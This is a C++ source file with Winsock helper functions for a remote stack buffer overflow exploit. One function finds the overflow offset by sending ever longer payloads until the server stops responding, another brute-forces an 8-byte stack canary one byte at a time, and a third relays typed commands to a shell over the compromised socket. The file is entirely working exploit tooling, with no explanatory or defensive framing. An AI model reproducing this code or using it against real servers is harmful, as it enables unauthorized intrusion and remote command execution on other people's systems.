#include "hdr.h"

int get_coff(addrinfo* addr, string payload) {
    int o = 0;
    string off;
    while (1) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, addr->ai_addr, (int)addr->ai_addrlen);
        send(sock, (payload + off).c_str(), (payload + off).length(), NULL);
        char buf[1];
        if (recv(sock, buf, 1, NULL) == SOCKET_ERROR) {
            closesocket(sock);
            return o - 1;
        }
        closesocket(sock);
        o++;
        off += "t";
    }
}

string get_canary(addrinfo* addr, string payload) {
    string o = "";
    for (int i = 0; i < 8; i++) {
        int b;
        for (b = 0; b < 256; b++) {
            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            connect(sock, addr->ai_addr, (int)addr->ai_addrlen);
            send(sock, (payload + o + (char)b).c_str(), (payload + o + (char)b).length(), NULL);
            char buf[1];
            if (recv(sock, buf, 1, NULL) != SOCKET_ERROR) {
                o += (char)b;
                closesocket(sock);
                break;
            }
            closesocket(sock);
        }
    }
    return o;
}

void shell(SOCKET sock, char* buf) {
    while (1) {
        string cmd;
        cin >> cmd;
        send(sock, cmd.c_str(), cmd.length(), NULL);

        DWORD bytes = recv(sock, buf, 500, NULL);
        cout << string(buf).substr(0, bytes) << endl << endl;
    }
}